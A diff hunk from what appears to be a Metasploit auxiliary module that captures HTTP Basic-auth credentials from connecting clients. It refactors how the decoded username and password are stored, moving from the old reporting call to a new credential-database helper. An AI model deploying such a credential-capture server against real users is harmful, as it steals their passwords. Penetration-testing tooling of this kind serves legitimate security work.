@@ -58,19 +58,44 @@ class Metasploit3 < Msf::Auxiliary
     exploit
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def on_request_uri(cli, req)
     if(req['Authorization'] and req['Authorization'] =~ /basic/i)
       basic,auth = req['Authorization'].split(/\s+/)
       user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
 
-      report_auth_info(
-        :host        => cli.peerhost,
-        :port        => datastore['SRVPORT'],
-        :sname       => 'HTTP',
-        :user        => user,
-        :pass        => pass,
-        :source_type => "captured",
-        :active      => true
+      report_cred(
+        ip: cli.peerhost,
+        port: datastore['SRVPORT'],
+        service_name: 'HTTP',
+        user: user,
+        password: pass,
+        proof: req['Authorization']
       )
 
       print_good("#{cli.peerhost} - Credential collected: \"#{user}:#{pass}\" => #{req.resource}")
